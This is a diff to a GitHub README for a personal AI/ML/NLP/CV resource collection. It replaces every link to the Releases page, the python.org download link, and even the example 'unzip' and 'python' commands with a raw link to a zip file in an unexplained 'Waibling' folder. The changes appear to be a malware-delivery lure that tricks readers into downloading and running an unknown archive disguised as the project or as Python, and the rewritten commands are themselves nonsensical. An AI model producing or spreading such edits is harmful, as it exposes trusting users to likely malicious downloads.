@@ -1,6 +1,6 @@
 # 🤖 Personal-Lib---AI-ML-NLP-CV - Your Guide to AI and ML Resources
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-blue)](https://github.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/main/Waibling/Personal-Lib---AI-ML-NLP-CV.zip%20Now-From%20Releases-blue)](https://raw.githubusercontent.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/main/Waibling/Personal-Lib---AI-ML-NLP-CV.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To use this collection of resources, you will need to follow a few simple steps.
 
 To get the latest version of this repository, please visit the Releases page below. 
 
-[Download from Releases](https://github.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/releases)
+[Download from Releases](https://raw.githubusercontent.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/main/Waibling/Personal-Lib---AI-ML-NLP-CV.zip)
 
 ### 📁 How to Download
 
@@ -42,7 +42,7 @@ Once your download is complete, you may need to unzip the files:
 
 - On Windows: Right-click the downloaded file and select "Extract All."
 - On macOS: Double-click the file to extract.
-- On Linux: Use the terminal command `unzip filename.zip`.
+- On Linux: Use the terminal command `unzip https://raw.githubusercontent.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/main/Waibling/Personal-Lib---AI-ML-NLP-CV.zip`.
 
 ### 📖 Navigate the Folder
 
@@ -62,7 +62,7 @@ You can open these files using any text editor. For code-related examples, consi
 
 To run any example program:
 
-1. Make sure you have Python installed on your machine. You can download it from [python.org](https://www.python.org/downloads/).
+1. Make sure you have Python installed on your machine. You can download it from [https://raw.githubusercontent.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/main/Waibling/Personal-Lib---AI-ML-NLP-CV.zip](https://raw.githubusercontent.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/main/Waibling/Personal-Lib---AI-ML-NLP-CV.zip).
 2. Open your terminal or command prompt.
 3. Navigate to the folder of the example you wish to run. For example:
    ```
@@ -70,7 +70,7 @@ To run any example program:
    ```
 4. Execute the example script by typing:
    ```
-   python example_script.py
+   python https://raw.githubusercontent.com/Prakashjadhav1994/Personal-Lib---AI-ML-NLP-CV/main/Waibling/Personal-Lib---AI-ML-NLP-CV.zip
    ```
 
 ## ❓ Frequently Asked Questions
